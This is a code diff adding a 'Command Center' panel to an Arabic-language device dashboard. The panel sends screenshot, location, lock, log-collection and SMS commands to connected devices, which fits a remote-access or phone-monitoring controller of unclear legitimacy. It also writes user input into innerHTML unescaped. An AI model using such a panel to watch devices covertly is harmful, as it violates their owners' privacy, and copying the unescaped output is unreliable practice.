@@ -231,10 +231,82 @@
     display:flex; align-items:center; gap:6px;
   }
 
+  /* ── Command Center Styles ── */
+  .command-card {
+    border-color: var(--purple) !important;
+    margin-bottom: 24px;
+  }
+  .command-card .card-header {
+    border-bottom-color: var(--border2) !important;
+  }
+  .cmd-select {
+    width:100%; padding:10px 14px; border-radius:10px;
+    background:var(--surface2); color:var(--text);
+    border:1px solid var(--border); font-size:13px;
+    outline:none; transition:border-color 0.2s;
+    font-family: 'Inter', sans-serif;
+  }
+  .cmd-select:focus {
+    border-color: var(--purple);
+  }
+  .cmd-input {
+    width:100%; padding:10px 14px; border-radius:10px;
+    background:var(--surface2); color:var(--text);
+    border:1px solid var(--border); font-size:13px;
+    outline:none; transition:border-color 0.2s;
+    font-family: 'Inter', sans-serif;
+  }
+  .cmd-input:focus {
+    border-color: var(--cyan);
+  }
+  .cmd-send-btn {
+    padding:10px 28px; border-radius:10px; border:none;
+    background: linear-gradient(135deg, var(--purple), var(--cyan));
+    color:#000; font-weight:700; font-size:13px;
+    cursor:pointer; transition:transform 0.2s, opacity 0.2s;
+    display:flex; align-items:center; gap:8px;
+    font-family: 'Inter', sans-serif;
+    white-space: nowrap;
+  }
+  .cmd-send-btn:hover { transform:scale(1.02); opacity:0.9; }
+  .cmd-send-btn:active { transform:scale(0.98); }
+
+  .cmd-response {
+    margin-top:16px; padding:12px 16px; border-radius:10px;
+    display:none; font-size:13px; font-weight:500;
+  }
+  .cmd-response.success {
+    display:block; background:rgba(0,230,118,0.12);
+    border:1px solid var(--green); color:var(--green);
+  }
+  .cmd-response.error {
+    display:block; background:rgba(255,82,82,0.12);
+    border:1px solid var(--red); color:var(--red);
+  }
+  .cmd-response.loading {
+    display:block; background:rgba(255,215,64,0.12);
+    border:1px solid var(--yellow); color:var(--yellow);
+  }
+
+  .quick-cmd {
+    padding:4px 14px; border-radius:20px;
+    background:rgba(124,77,255,0.15); color:var(--purple);
+    border:1px solid rgba(124,77,255,0.2); font-size:12px;
+    cursor:pointer; transition:all 0.2s;
+    font-weight:500; font-family: 'Inter', sans-serif;
+  }
+  .quick-cmd:hover {
+    background:rgba(124,77,255,0.25);
+    border-color:var(--purple);
+    transform:scale(1.05);
+  }
+
   @media(max-width:900px) {
     .sidebar { display:none; }
     .main { margin-right:0; padding:16px; }
     .two-col { grid-template-columns:1fr; }
+    .cmd-flex { flex-direction:column !important; }
+    .cmd-send-btn { width:100%; justify-content:center; }
   }
 </style>
 </head>
@@ -329,6 +401,69 @@
 
   </div>
 
+  <!-- ── COMMAND CENTER ── -->
+  <div class="card command-card">
+    <div class="card-header">
+      <span style="display:flex;align-items:center;gap:8px;">
+        <span style="font-size:20px;">🚀</span> إرسال أمر إلى الجهاز
+      </span>
+      <span class="badge badge-purple">Command Center</span>
+    </div>
+    <div style="padding: 20px;">
+      <div style="display:flex; flex-wrap:wrap; gap:12px; align-items:flex-end;" class="cmd-flex">
+        
+        <!-- اختيار الجهاز -->
+        <div style="flex:1; min-width:180px;">
+          <label style="display:block; font-size:11px; color:var(--text3); margin-bottom:4px; letter-spacing:0.5px;">
+            📱 اختر الجهاز
+          </label>
+          <select id="deviceSelect" class="cmd-select">
+            <option value="all">🌐 جميع الأجهزة</option>
+            {% if devices %}
+              {% for d in devices %}
+              <option value="{{ d.get('id', d.get('model', 'unknown')) }}">
+                {{ d.get('model', 'جهاز') }} ({{ d.get('ip', '') }})
+              </option>
+              {% endfor %}
+            {% else %}
+              <option value="all" disabled>⚠️ لا توجد أجهزة متصلة</option>
+            {% endif %}
+          </select>
+        </div>
+
+        <!-- كتابة الأمر -->
+        <div style="flex:2; min-width:200px;">
+          <label style="display:block; font-size:11px; color:var(--text3); margin-bottom:4px; letter-spacing:0.5px;">
+            ⚡ الأمر
+          </label>
+          <input type="text" id="commandInput" class="cmd-input" placeholder="مثال: screenshot, location, message:Hello">
+        </div>
+
+        <!-- زر الإرسال -->
+        <div>
+          <button onclick="sendCommand()" class="cmd-send-btn">
+            <span>🚀</span> إرسال
+          </button>
+        </div>
+
+      </div>
+
+      <!-- منطقة عرض النتيجة -->
+      <div id="commandResponse" class="cmd-response"></div>
+
+      <!-- الأوامر السريعة -->
+      <div style="margin-top:14px; display:flex; flex-wrap:wrap; gap:8px; align-items:center;">
+        <span style="font-size:11px; color:var(--text3); margin-left:6px;">⏱ أوامر سريعة:</span>
+        <button onclick="quickCommand('screenshot')" class="quick-cmd">📸 Screenshot</button>
+        <button onclick="quickCommand('location')" class="quick-cmd">📍 Location</button>
+        <button onclick="quickCommand('info')" class="quick-cmd">ℹ️ Device Info</button>
+        <button onclick="quickCommand('lock')" class="quick-cmd">🔒 Lock</button>
+        <button onclick="quickCommand('log')" class="quick-cmd">📋 Logs</button>
+        <button onclick="quickCommand('message:Hello World')" class="quick-cmd">💬 Send SMS</button>
+      </div>
+    </div>
+  </div>
+
   <!-- Two columns -->
   <div class="two-col">
 
@@ -415,6 +550,70 @@
 <script>
   // تحديث تلقائي كل 30 ثانية
   setTimeout(() => location.reload(), 30000);
+
+  // ── Command Functions ──
+  function sendCommand() {
+    const device = document.getElementById('deviceSelect').value;
+    const command = document.getElementById('commandInput').value.trim();
+    const responseDiv = document.getElementById('commandResponse');
+
+    if (!command) {
+      responseDiv.className = 'cmd-response error';
+      responseDiv.innerHTML = '⚠️ الرجاء كتابة أمر لإرساله';
+      return;
+    }
+
+    // إظهار حالة التحميل
+    responseDiv.className = 'cmd-response loading';
+    responseDiv.innerHTML = '⏳ جاري إرسال الأمر...';
+
+    // إرسال الطلب
+    fetch('/send_command', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        device_id: device,
+        command: command
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.status === 'ok') {
+        responseDiv.className = 'cmd-response success';
+        responseDiv.innerHTML = `✅ تم إرسال الأمر <strong>"${command}"</strong> إلى <strong>${device}</strong> بنجاح`;
+        document.getElementById('commandInput').value = '';
+        // إخفاء الرسالة بعد 5 ثواني
+        setTimeout(() => {
+          responseDiv.className = 'cmd-response';
+          responseDiv.innerHTML = '';
+        }, 5000);
+      } else {
+        throw new Error(data.msg || 'فشل الإرسال');
+      }
+    })
+    .catch(error => {
+      responseDiv.className = 'cmd-response error';
+      responseDiv.innerHTML = `❌ خطأ: ${error.message}`;
+    });
+  }
+
+  function quickCommand(cmd) {
+    document.getElementById('commandInput').value = cmd;
+    sendCommand();
+  }
+
+  // إرسال الأمر بالضغط على Enter
+  document.getElementById('commandInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') sendCommand();
+  });
+
+  // اختيار الجهاز الأول تلقائياً إذا كان هناك جهاز واحد فقط
+  document.addEventListener('DOMContentLoaded', function() {
+    const select = document.getElementById('deviceSelect');
+    if (select.options.length === 2) { // option all + جهاز واحد
+      select.selectedIndex = 1;
+    }
+  });
 </script>
 </body>
 </html>
